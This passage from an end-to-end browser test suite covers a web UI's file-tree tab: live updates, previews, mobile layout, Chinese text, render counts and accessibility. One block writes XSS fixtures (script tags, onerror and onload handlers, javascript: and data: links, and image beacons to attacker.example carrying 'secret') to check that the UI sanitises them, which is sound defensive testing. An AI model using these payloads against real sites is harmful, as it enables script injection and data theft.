		// The turn is still running: the tree followed the folder, not the end of the turn.
		await expect(page.getByTestId("stop")).toBeVisible();
		await expect(page.getByTestId("stop")).toHaveCount(0, { timeout: 60_000 });
		rmSync(join(proj, "made-by-the-turn.md"));
		rmSync(join(proj, "src", "made-in-src.ts"));
		await expect(row(page, "made-by-the-turn.md")).toHaveCount(0);
		await expect(row(page, "src/made-in-src.ts")).toHaveCount(0);
	});

	test("when the server's watch says nothing, the tree is read again when the turn ends", async ({ page }) => {
		// The page never asks for a watch: only the end of the turn can bring the file in.
		await page.addInitScript(() => {
			const send = WebSocket.prototype.send;
			WebSocket.prototype.send = function (data) {
				if (typeof data === "string" && data.includes('"folder_watch"')) return;
				return send.call(this, data);
			};
		});
		await openFiles(page);
		await treeReady(page);
		await page.getByTestId("composer").fill(turn());
		await page.getByTestId("composer").press("Enter");
		await expect(page.getByTestId("stop")).toBeVisible({ timeout: 60_000 });
		writeFileSync(join(proj, "only-at-turn-end.txt"), "x");
		// An absence cannot be awaited: a real wait, well past the debounce the watch would have had.
		await page.waitForTimeout(1200);
		await expect(page.getByTestId("stop")).toBeVisible();
		await expect(row(page, "only-at-turn-end.txt")).toHaveCount(0);
		await expect(page.getByTestId("stop")).toHaveCount(0, { timeout: 60_000 });
		await expect(row(page, "only-at-turn-end.txt")).toBeVisible();
		rmSync(join(proj, "only-at-turn-end.txt"));
	});

	test("an open file follows what is written to it", async ({ page }) => {
		writeFileSync(join(proj, "following.txt"), "first\n");
		await openFiles(page);
		const preview = await openFile(page, "following.txt");
		await expect(preview.getByTestId("file-code")).toContainText("first");
		writeFileSync(join(proj, "following.txt"), "second\n");
		await expect(preview.getByTestId("file-code")).toContainText("second");
		rmSync(join(proj, "following.txt"));
	});

	test("a folder that is removed while open is closed, and the rest of the tree stays", async ({ page }) => {
		mkdirSync(join(proj, "short-lived-dir"));
		writeFileSync(join(proj, "short-lived-dir", "a.txt"), "x");
		await openFiles(page);
		await treeReady(page);
		await row(page, "short-lived-dir").click();
		await expect(row(page, "short-lived-dir/a.txt")).toBeVisible();
		rmSync(join(proj, "short-lived-dir"), { recursive: true });
		await expect(row(page, "short-lived-dir")).toHaveCount(0);
		await expect(row(page, "src")).toBeVisible();
	});
});

test.describe("hostile files run nothing", () => {
	const HTML =
		'<!doctype html><html><body><script>window.__pwn = "html"</script><img src=x onerror="window.__pwn=1"></body></html>';
	const MD = [
		"# Hostile",
		"",
		'<img src=x onerror="window.__pwn=1">',
		"",
		"<script>window.__pwn = 'md'</script>",
		"",
		'<iframe srcdoc="<script>parent.__pwn=1</script>"></iframe>',
		"",
		"[run](javascript:window.__pwn=1)",
		"",
		"[page](data:text/html,<script>parent.__pwn=1</script>)",
		"",
		"![leak](https://attacker.example/leak?d=secret)",
		"",
	].join("\n");
	const SVG =
		'<svg xmlns="http://www.w3.org/2000/svg" width="80" height="40" onload="window.__pwn=1"><script>window.__pwn=1</script><image href="https://attacker.example/leak.png" width="10" height="10"/><rect width="80" height="40" fill="#3b82f6"/></svg>';

	test.beforeAll(() => {
		mkdirSync(join(proj, "hostile"), { recursive: true });
		writeFileSync(join(proj, "hostile", "evil.md"), MD);
		writeFileSync(join(proj, "hostile", "evil.svg"), SVG);
		writeFileSync(join(proj, "hostile", "evil.png"), HTML);
	});
	test.afterAll(() => rmSync(join(proj, "hostile"), { recursive: true, force: true }));

	test("a Markdown file, an SVG and a page dressed as a picture show as what they are and run nothing, ask nothing of anyone else", async ({
		page,
	}) => {
		const external: string[] = [];
		await page.route(/^https?:\/\/(?!127\.0\.0\.1)/, (route) => {
			external.push(route.request().url());
			return route.abort();
		});
		await openFiles(page);
		await treeReady(page);
		const pwned = () => page.evaluate(() => Reflect.get(window, "__pwn"));
		await row(page, "hostile").click();

		// Markdown: raw HTML is text, a script is text, `javascript:` and `data:` links are not links, a remote picture is a link.
		const md = await openFile(page, "hostile/evil.md");
		const rendered = md.getByTestId("file-markdown");
		await expect(rendered.getByRole("heading", { name: "Hostile" })).toBeVisible();
		await expect(rendered).toContainText("<script>");
		await expect(rendered.locator("script, iframe, img, object, embed")).toHaveCount(0);
		await expect(rendered.locator('a[href^="javascript:"], a[href^="data:"]')).toHaveCount(0);
		await expect(rendered.locator('a[href^="https://attacker.example"]')).toHaveCount(1);
		await md.getByTestId("file-source-toggle").click();
		await expect(md.getByTestId("file-code")).toContainText("onerror");
		await page.getByTestId("file-back").click();

		// An SVG is drawn as a picture (where a script does not run and nothing is fetched), and has its source.
		const svg = await openFile(page, "hostile/evil.svg");
		await expect(svg.getByTestId("file-image").locator("img")).toBeVisible();
		await expect
			.poll(() =>
				svg
					.getByTestId("file-image")
					.locator("img")
					.evaluate((el: HTMLImageElement) => el.naturalWidth),
			)
			.toBe(80);
		await svg.getByTestId("file-source-toggle").click();
		await expect(svg.getByTestId("file-code")).toContainText("<script>");
		await page.getByTestId("file-back").click();

		// A page with a picture's name is not drawn, and is not run: the panel says it cannot open it.
		const png = await openFile(page, "hostile/evil.png");
		await expect(png.getByText("Can't open this file")).toBeVisible();
		await page.getByTestId("file-back").click();

		expect(await pwned()).toBeUndefined();
		expect(external).toEqual([]);
	});

	test("opened by its address, a page with a picture's name is an image and nothing is run", async ({ page }) => {
		await openFiles(page);
		const tab = await page.context().newPage();
		const files = await fetch(`${s.url}/api/sessions`, { headers: { "x-omp-webui-token": s.accessToken } });
		const sessions = (await files.json()) as { file: string; title: string }[];
		const target = sessions.find((x) => x.title === TITLE)?.file as string;
		const response = await tab.goto(`${s.url}/api/folder/raw?file=${encodeURIComponent(target)}&path=hostile/evil.png`);
		expect(response?.headers()["content-type"]).toBe("image/png");
		expect(response?.headers()["x-content-type-options"]).toBe("nosniff");
		expect(await tab.evaluate(() => Reflect.get(window, "__pwn"))).toBeUndefined();
		const svg = await tab.goto(`${s.url}/api/folder/raw?file=${encodeURIComponent(target)}&path=hostile/evil.svg`);
		expect(svg?.status()).toBe(415);
		await tab.close();
	});
});

test.describe("a page that is not this computer's", () => {
	test("has no switch for what is hidden, and is told so when a search finds nothing", async ({ page }) => {
		// The server says the page is guarded (see tests/contract/folder.test.ts for what it then leaves out).
		await page.route("**/api/folder/list**", async (route) => {
			const res = await route.fetch();
			await route.fulfill({ response: res, json: { ...(await res.json()), guarded: true } });
		});
		await openFiles(page);
		await treeReady(page);
		await expect(page.getByTestId("files-refresh")).toBeVisible();
		await expect(page.getByTestId("files-show-hidden")).toHaveCount(0);
		await page.getByTestId("files-filter").fill("no-such-file-anywhere");
		await expect(page.getByTestId("files-none")).toBeVisible();
		await expect(page.getByTestId("files-none")).not.toContainText("hidden");
	});
});

test.describe("what it costs the rest of the page", () => {
	test("what the tab does renders nothing of the conversation, and streamed tokens render nothing of the tab", async ({
		page,
	}) => {
		await page.addInitScript(COUNT_RENDERS);
		await openFiles(page);
		await treeReady(page);
		// The components: the conversation (it draws the transcript), the message box, and the tab itself.
		await countRendersOf(page, "transcript", "chat");
		await countRendersOf(page, "composer", "composer");
		await countRendersOf(page, "files-pane", "pane");
		await settled(page, "chat");
		const counts = async () => ({
			chat: await rendersCounted(page, "chat"),
			composer: await rendersCounted(page, "composer"),
			pane: await rendersCounted(page, "pane"),
		});

		// The counter counts: typing draws the message box.
		const idle = await counts();
		await page.getByTestId("composer").fill("x");
		await painted(page);
		expect((await counts()).composer, "typing draws the message box").toBeGreaterThan(idle.composer);
		await page.getByTestId("composer").fill("");
		await painted(page);

		// What the tab does: open folders, filter, look at a file, come back, hide and show what is hidden, read again.
		const start = await counts();
		await row(page, "src").click();
		await row(page, "src/lib").click();
		await page.getByTestId("files-filter").fill("greet");
		await expect(page.getByTestId("files-hit")).toBeVisible();
		await page.getByTestId("files-hit").click();
		await expect(page.getByTestId("file-code")).toBeVisible();
		await page.getByTestId("file-back").click();
		await page.getByTestId("files-filter-clear").click();
		await page.getByTestId("files-show-hidden").click();
		await expect(row(page, ".env")).toBeVisible();
		await page.getByTestId("files-show-hidden").click();
		await page.getByTestId("files-refresh").click();
		await painted(page);
		await painted(page);
		const after = await counts();
		expect(after.pane, "the tab renders for what it does").toBeGreaterThan(start.pane);
		expect(after.composer, "the message box").toBe(start.composer);
		expect(after.chat, "the conversation").toBe(start.chat);

		// A turn writes the store at every frame: the tab, open on its tree, is not drawn for any of them.
		await page.getByTestId("composer").fill(turn());
		await page.getByTestId("composer").press("Enter");
		await expect(page.getByTestId("stop")).toBeVisible({ timeout: 60_000 });
		await painted(page);
		// What the tab was still reading from what it was asked a moment ago is over first (the count holds still).
		let last = -1;
		await expect
			.poll(
				async () => {
					const now = (await counts()).pane;
					const still = now === last;
					last = now;
					return still;
				},
				{ intervals: [700], timeout: 30_000 },
			)
			.toBe(true);
		const streaming = await counts();
		// Tokens stream while this waits: a real wait, as an absence of renders is only seen over time.
		await page.waitForTimeout(1500);
		await expect(page.getByTestId("stop")).toBeVisible();
		await painted(page);
		const during = await counts();
		expect(during.pane, "the tab while a turn streams").toBe(streaming.pane);
		// The counter counts: the turn did draw the conversation.
		expect(during.chat, "the conversation while a turn streams").toBeGreaterThan(after.chat);
	});
});

test.describe("on a phone", () => {
	test.use({ viewport: { width: 390, height: 844 }, hasTouch: true });

	test("the tab is a sheet: the tree and a preview fit it, Escape in the filter clears it without closing the sheet, and a mention is put in without the keyboard", async ({
		page,
	}) => {
		await page.addInitScript(() => localStorage.setItem("ompw.autoTitle", "off"));
		await page.goto(`${s.url}/?token=${s.accessToken}`);
		await page.getByRole("button", { name: /Show sidebar/ }).click();
		await page.locator('[data-testid="session-item"]', { hasText: TITLE }).click();
		await expect(page.getByTestId("composer")).toBeVisible();
		await page.getByTestId("toggle-panel").click();
		await panel(page).getByTestId("panel-pane-top").getByRole("tab", { name: "Files" }).click();
		await treeReady(page);
		const sheet = await boxOf(panel(page));
		expect(sheet.x + sheet.width).toBeLessThanOrEqual(390);
		const overflow = (loc: Locator) => loc.evaluate((el) => el.scrollWidth > el.clientWidth);
		expect(await overflow(page.getByTestId("files-pane"))).toBe(false);
		// Rows are as tall as a finger needs.
		expect((await boxOf(row(page, "src"))).height).toBeGreaterThanOrEqual(36);

		const filter = page.getByTestId("files-filter");
		await filter.fill("app");
		await expect(page.getByTestId("files-hit")).toBeVisible();
		await filter.press("Escape");
		await expect(filter).toHaveValue("");
		await expect(panel(page)).toBeVisible();

		await row(page, "src").click();
		await row(page, "src/app.ts").click();
		const preview = page.getByTestId("file-preview");
		await expect(preview.getByTestId("file-code")).toBeVisible();
		expect(await overflow(page.getByTestId("files-pane"))).toBe(false);
		const actions = ["file-back", "file-copy-path", "file-mention", "file-larger"];
		for (const id of actions) {
			const box = await boxOf(preview.getByTestId(id));
			expect(box.x + box.width, id).toBeLessThanOrEqual(390);
			expect(box.height, id).toBeGreaterThanOrEqual(24);
		}
		await preview.getByTestId("file-mention").click();
		await expect(page.getByTestId("toast")).toContainText("@src/app.ts");
		await expect(page.getByTestId("composer")).not.toBeFocused();
		await expect(page.getByTestId("composer")).toHaveValue("@src/app.ts ");

		// Opened large it is the whole screen, over the sheet: one column of code, its close within reach of a thumb, and
		// the way back is the same Escape.
		await preview.getByTestId("file-larger").click();
		const large = page.getByTestId("big-view");
		await expect(large).toBeVisible();
		// It fades in (its box moves): measured once the fade is over, as a person sees it.
		await page.evaluate(() =>
			Promise.allSettled(
				document
					.getAnimations()
					.filter((a) => a.effect?.getComputedTiming().iterations !== Number.POSITIVE_INFINITY)
					.map((a) => a.finished),
			),
		);
		const full = await boxOf(large);
		expect(full.x).toBe(0);
		expect(full.y).toBe(0);
		expect(full.width).toBe(390);
		expect(full.height).toBe(844);
		// The view fits the window; a long line of code scrolls inside its own box, as it does in the panel.
		expect(await overflow(large)).toBe(false);
		const close = await boxOf(page.getByTestId("big-close"));
		expect(close.x + close.width).toBeLessThanOrEqual(390);
		expect(close.height).toBeGreaterThanOrEqual(24);
		await expect(page.getByTestId("big-file-body")).toContainText("export function main");
		await page.keyboard.press("Escape");
		await expect(large).toHaveCount(0);
		await expect(panel(page)).toBeVisible();
	});
});

test.describe("in Chinese", () => {
	// By the browser's language, which the page follows until a language is chosen: nothing is saved for the other specs.
	test.use({ locale: "zh-CN" });

	test("the tab, its tools and its messages are in Simplified Chinese", async ({ page }) => {
		await openFiles(page);
		await treeReady(page);
		await expect(panel(page).getByTestId("panel-pane-bottom").getByRole("tab", { name: "文件" })).toBeVisible();
		await expect(page.getByTestId("files-filter")).toHaveAttribute("placeholder", "筛选文件…");
		await expect(page.getByTestId("files-show-hidden")).toHaveAccessibleName(/显示隐藏文件（已隐藏 \d+ 项）/);
		await expect(page.getByRole("tree")).toHaveAccessibleName("文件");
		await expect(row(page, "README.md").getByTestId("git-mark")).toContainText("已修改");
		await page.getByTestId("files-filter").fill("没有这个文件");
		await expect(page.getByTestId("files-none")).toContainText("没有文件匹配“没有这个文件”");
		await page.getByTestId("files-filter-clear").click();
		await row(page, "data.bin").click();
		await expect(page.getByTestId("file-preview")).toContainText("二进制文件，8 B");
		await expect(page.getByTestId("file-mention")).toHaveAccessibleName("作为 @ 提及插入");
		await expect(page.getByTestId("file-back")).toHaveAccessibleName("返回文件列表");
		// Large in the main area: the button that opens it and the view itself are in Chinese too.
		await expect(page.getByTestId("file-larger")).toHaveAccessibleName("在主区域放大打开");
		await page.getByTestId("file-back").click();
		await row(page, "src").click();
		await row(page, "src/app.ts").click();
		await page.getByTestId("file-larger").click();
		await expect(page.getByTestId("big-view")).toHaveAccessibleName("app.ts 的大视图");
		await expect(page.getByTestId("big-close")).toHaveAccessibleName("关闭");
		await page.getByTestId("big-close").click();
		await expect(page.getByTestId("big-view")).toHaveCount(0);
	});
});

for (const theme of ["light", "dark"] as const) {
	test.describe(`${theme} theme`, () => {
		test.beforeEach(async ({ page }) => {
			await page.addInitScript((t) => localStorage.setItem("ompw.theme", t), theme);
		});

		test("the tree, the filter and a preview pass axe, and their small text has the contrast it needs", async ({
			page,
		}) => {
			await openFiles(page);
			await treeReady(page);
			await row(page, "src").click();
			await expect(row(page, "src/app.ts")).toBeVisible();
			const scan = async (where: string) => {
				const { violations } = await new AxeBuilder({ page }).include('[data-testid="right-panel"]').analyze();
				expect(
					violations.map((v) => `${where}: ${v.id} ${v.nodes.map((n) => n.target.join(" ")).join(" | ")}`),
					where,
				).toEqual([]);
			};
			await scan("tree");
			// The marks and the dimmed (hidden) names are text on the panel: 4.5:1.
			const ratios: Record<string, number> = {};
			ratios["modified mark"] = await contrastOf(row(page, "README.md").getByTestId("git-mark"), "color");
			ratios["untracked mark"] = await contrastOf(row(page, "logo.png").getByTestId("git-mark"), "color");
			ratios["changed folder mark"] = await contrastOf(row(page, "src").getByTestId("git-mark"), "color");
			ratios["filter placeholder"] = await contrastOf(page.getByTestId("files-filter"), "placeholder");
			await page.getByTestId("files-show-hidden").click();
			await expect(row(page, ".env")).toBeVisible();
			ratios["hidden name"] = await contrastOf(row(page, ".env"), "color");
			const low = Object.entries(ratios).filter(([, r]) => r < 4.5);
			expect(low, JSON.stringify(ratios)).toEqual([]);
			await page.getByTestId("files-show-hidden").click();
			await page.getByTestId("files-filter").fill("app");
			await expect(page.getByTestId("files-hit")).toBeVisible();
			await scan("results");
			await page.getByTestId("files-filter-clear").click();
			await row(page, "src/app.ts").click();
			await expect(page.getByTestId("file-code").locator("pre.shiki")).toBeVisible();
			await scan("code preview");
			await page.getByTestId("file-back").click();
			await row(page, "README.md").click();
			await expect(page.getByTestId("file-markdown")).toBeVisible();
			await scan("markdown preview");
			await page.getByTestId("file-back").click();
			await row(page, "data.bin").click();
			await expect(page.getByTestId("file-preview")).toContainText("Binary file");
			await scan("binary preview");
			// The same preview large in the main area (#635): one file, drawn by the same body, in this theme.
			await page.getByTestId("file-back").click();
			// `src` is open already: clicking it would close it.
			await row(page, "src/app.ts").click();
			await page.getByTestId("file-larger").click();
			await expect(page.getByTestId("big-view")).toBeVisible();
			// The view fades in, and axe reads the colours of what is on screen: it waits for that to be over.
			await settledFade(page);
			const large = await new AxeBuilder({ page }).include('[data-testid="big-view"]').analyze();
			expect(
				large.violations.map((v) => `large file: ${v.id} ${v.nodes.map((n) => n.target.join(" ")).join(" | ")}`),
				"large file",
			).toEqual([]);
		});
	});
}
